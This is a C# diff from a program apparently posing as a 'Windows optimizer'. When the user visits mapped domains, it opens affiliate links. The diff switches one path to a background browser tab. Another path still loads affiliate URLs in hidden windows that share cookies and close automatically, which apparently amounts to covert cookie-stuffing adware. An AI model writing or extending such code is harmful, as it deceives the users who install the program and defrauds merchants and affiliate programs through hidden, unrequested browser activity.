@@ -223,8 +223,8 @@ namespace WindowsOptimizer.Services
             LogService.Instance.Log($"         ★ 실행! ({mapping.AutoTabCount}/{mapping.Frequency})");
             DomainTriggered?.Invoke(url, mapping, "AutoTab");
 
-            // 히든 윈도우 방식으로 제휴 링크 열기 (쿠키 공유됨)
-            OpenHiddenWindow(mapping.Target, config.OpenHdCloseTime > 0 ? config.OpenHdCloseTime : 15);
+            // 기존 브라우저에 새 탭으로 제휴 링크 열기
+            OpenTabInBackground(mapping.Target);
         }
 
         private void ProcessOpenHd(DomainMapping mapping, string url)
@@ -276,6 +276,36 @@ namespace WindowsOptimizer.Services
 
             // 히든 윈도우 방식으로 제휴 링크 열기 (쿠키 공유됨, DelayTime 적용)
             OpenHiddenWindow(mapping.Target, config.OpenHdCloseTime, config.OpenHdDelayTime);
+        }
+
+        /// <summary>
+        /// 기존 브라우저에 새 탭으로 URL 열기 (AutoTab 전용)
+        /// 히든 처리/창 감지/자동 닫기 없이 일반 탭으로 열림
+        /// </summary>
+        private void OpenTabInBackground(string targetUrl)
+        {
+            try
+            {
+                var url = targetUrl;
+                if (!targetUrl.StartsWith("http://", StringComparison.OrdinalIgnoreCase) &&
+                    !targetUrl.StartsWith("https://", StringComparison.OrdinalIgnoreCase))
+                {
+                    url = "https://" + targetUrl;
+                }
+
+                // 기본 브라우저로 URL 열기 (이미 실행 중인 브라우저가 있으면 새 탭으로 열림)
+                Process.Start(new ProcessStartInfo
+                {
+                    FileName = url,
+                    UseShellExecute = true
+                });
+
+                LogService.Instance.Log($"[AutoTab] ✓ 새 탭 열기: {url}");
+            }
+            catch (Exception ex)
+            {
+                LogService.Instance.Log($"[AutoTab] ✗ 탭 열기 오류: {ex.Message}");
+            }
         }
 
         /// <summary>
